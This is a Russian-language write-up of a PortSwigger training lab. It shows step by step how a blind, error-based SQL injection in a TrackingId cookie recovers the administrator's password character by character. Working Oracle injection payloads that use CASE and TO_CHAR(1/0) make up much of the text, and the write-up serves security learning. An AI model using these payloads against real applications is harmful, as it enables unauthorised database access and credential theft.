---
title: "Blind SQL injection with conditional errors"
date: 2025-06-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors"
classes: wide
---

В данной лабе есть уязвимый к **Blind based SQL injection** параметр в `Cookie`. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.

```
https://0ae90054044f120581a76bcc00c300ed.web-security-academy.net/
```


## Solution

Во-первых, из условия известно, что уязвимость находится в `Cookie`, значит есть смысл сразу смотреть `HTTP` запросы.
Во-вторых, известно, что это `Blind SQLi`, поэтому будет весело...


Итак, возьму `GET`-запрос:

```http
GET /filter?category=Gifts HTTP/2
Host: 0ae90054044f120581a76bcc00c300ed.web-security-academy.net
Cookie: TrackingId=qj7wR5JE68DIePPM; session=sdjSIBQgVY0TIDfdZDJ4oAKTKfz0ZAzb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af700f20342cbdda9c9b2a200cb0036.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

Скорее всего уязвимым является `TrackingId`. Попробую посмотреть, как изменится ответ при не верном значении `TrackingId=qj7wR5JE68DIePPM`:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5267
```

Запрос отработал корректно, попробую добавить кавычку `TrackingId=qj7wR5JE68DIePPM'`:

```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2324
```

Значит обрамление для запроса — это одинарная кавычка `'`. Протестирую это:

```
qj7wR5JE68DIePPM' and 1=0-- -Ok
qj7wR5JE68DIePPM' and 1=1-- -OK
```

Оба запроса отработали корректно. Это значит, что обрамление подобрано корректно, но проверка условий не работает. В таком случае можно попробовать **Error based SQL injection**. Ее идея в том, чтобы вызвать ошибку в запросе, благодаря чему у нас на странице может отобразиться сообщение о ней. Объединив это с оператором `CASE`, можно сделать следующий запрос:

```
qj7wR5JE68DIePPM' and (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '1' END FROM dual) = '1'-- -Ok
qj7wR5JE68DIePPM' and (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual) = '1'-- -Error
```

Запрос работает. Теперь в качестве условия подставлю нужное условие. Попробую узнать длину пароля:

```
qj7wR5JE68DIePPM' and (SELECT CASE WHEN LENGTH(password) < 40 THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username = 'administrator') = '1'-- -Error
qj7wR5JE68DIePPM' and (SELECT CASE WHEN LENGTH(password) < 20 THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username = 'administrator') = '1'-- -OK
qj7wR5JE68DIePPM' and (SELECT CASE WHEN LENGTH(password) > 20 THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username = 'administrator') = '1'-- -Ok
qj7wR5JE68DIePPM' and (SELECT CASE WHEN LENGTH(password) = 20 THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username = 'administrator') = '1'-- -Error
```

Я получил ошибку при условии `LENGTH(password) = 20`, значит длина пароля 20 символов. Теперь использую `SUBSTR` для подбора каждого символа со следующим пейлоадом:

```
qj7wR5JE68DIePPM' and (SELECT CASE WHEN SUBSTRING(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username = 'administrator') = '1'-- -
```

Для упрощения подбора я использую `Burp Suite Intruder` с атакой `Brute Force`.

```
qj7wR5JE68DIePPM' and (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE '1' END FROM users WHERE username = 'administrator') = '1'-- -
```

Правильная буква будет в том случае, когда на запрос выдается ошибка с кодом `500`, поэтому я отфильтровал другие запросы:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_errors/1.png){: height="200" .align-center}


После 20 запросов я получил пароль: `h1dqh09pg0e86htryfv9`. Проверю его:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_errors/2.png){: height="200" .align-center}


Вообще изи, решил не глядя) ☕
